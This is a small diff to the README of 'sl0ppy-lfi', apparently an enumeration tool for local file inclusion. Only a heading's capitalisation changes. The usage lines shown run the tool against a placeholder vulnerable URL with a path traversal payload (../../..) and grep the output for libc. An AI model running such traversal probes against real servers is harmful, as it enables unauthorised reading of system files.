@@ -29,7 +29,7 @@ A small lfi enum tool, i upgraded the original source a bits here and there.
 * `./sl0ppy-lfi http://server.vulnerable.com/index.php?page=../../../../../../../../../../` 
 
 
-# enum specific stuff like only libc
+# Enum specific stuff like only libc
 * `./sl0ppy-lfi http://server.vulnerable.com/index.php?page= | grep "libc"`
 * `./sl0ppy-lfi http://server.vulnerable.com/index.php?page=../../../../../../../../../../ | grep "libc"` 
 
